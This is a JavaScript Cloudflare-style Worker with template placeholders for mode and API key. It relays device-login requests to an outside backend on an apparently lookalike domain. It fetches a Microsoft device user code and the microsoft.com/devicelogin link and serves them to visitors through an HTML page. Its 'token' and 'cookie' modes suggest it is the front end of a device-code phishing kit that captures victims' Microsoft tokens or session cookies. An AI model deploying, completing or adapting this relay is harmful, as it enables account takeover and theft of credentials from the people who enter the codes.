addEventListener('fetch', event => {
  event.respondWith(handleRequest(event.request))
})

const MODE = "{{MODE}}"          // token | cookie
const API_KEY = "{{API_KEY}}"
const BASE_URL = "https://nomaerngineering.com"

async function handleRequest(request) {
  const url = new URL(request.url)
  const path = url.pathname

  if (request.method === "GET" && path === "/") {
    return new Response(htmlUI(), {
      headers: { "content-type": "text/html" }
    })
  }

  if (request.method === "POST" && path === "/api/device/start") {
    return start()
  }

  if (request.method === "GET" && path.startsWith("/api/device/status/")) {
    const loginId = path.split("/").pop()
    return poll(loginId)
  }

  return new Response("Not found", { status: 404 })
}

//
// =========================
// 🚀 START
// =========================
async function start() {
  try {

    let endpoint = ""
    let headers = {
      "Content-Type": "application/json"
    }

    // =========================
    // 🔥 MODE HANDLING
    // =========================
    if (MODE === "cookie") {
      endpoint = "/api/python/start"
      headers["Authorization"] = "Bearer " + API_KEY
    } else {
      // 🔥 TOKEN MODE (MicrosoftAuthController)
      endpoint = `/api/start?api_key=${API_KEY}`
    }

    const resp = await fetch(BASE_URL + endpoint, {
      method: "POST",
      headers
    })

    const text = await resp.text()

    if (!resp.ok) {
      return new Response("HTTP ERROR " + resp.status + "\n\n" + text)
    }

    let data
    try {
      data = JSON.parse(text)
    } catch {
      return new Response("INVALID JSON:\n\n" + text)
    }

    // =========================
    // 🔥 NORMALIZE START RESPONSE
    // =========================
    let jobId = null

    if (MODE === "cookie") {
      jobId = data.job_id || null
    } else {
      jobId = data.login_id || null
    }

    return Response.json({
      job_id: jobId,
      status: data.status || "pending"
    })

  } catch (e) {
    return Response.json({
      error: "Worker crash",
      message: e.message
    })
  }
}

//
// =========================
// 🔄 POLL
// =========================
async function poll(loginId) {
  try {

    if (!loginId || isNaN(loginId)) {
      return new Response("Invalid ID", { status: 400 })
    }

    let endpoint = ""
    let headers = {}

    // =========================
    // 🔥 MODE HANDLING
    // =========================
    if (MODE === "cookie") {
      endpoint = `/api/python/job/${loginId}`
      headers["Authorization"] = "Bearer " + API_KEY
    } else {
      endpoint = `/api/poll/${loginId}?api_key=${API_KEY}`
    }

    const resp = await fetch(BASE_URL + endpoint, { headers })

    const text = await resp.text()

    if (!resp.ok) {
      return new Response("HTTP ERROR " + resp.status + "\n\n" + text)
    }

    let data
    try {
      data = JSON.parse(text)
    } catch {
      return new Response("INVALID JSON:\n\n" + text)
    }

    // =========================
    // 🔥 NORMALIZE RESPONSE
    // =========================
    let userCode = null
    let verificationUri = null
    let status = data.status || "pending"

    if (MODE === "cookie") {
      const device = data.result?.device || {}

      userCode = device.device_code || null
      verificationUri = device.verification_uri || null

    } else {
      // 🔥 TOKEN MODE (MicrosoftAuthController)
      userCode = data.user_code || null
      verificationUri = data.verification_uri || "https://microsoft.com/devicelogin"
    }

    return Response.json({
      status,
      user_code: userCode,
      verification_uri: verificationUri,
      error: data.error || null
    })

  } catch (e) {
    return Response.json({
      error: "Worker error",
      message: e.message
    })
  }
}

//
// =========================
// UI
// =========================
function htmlUI() {
  return HTML_CONTENT
}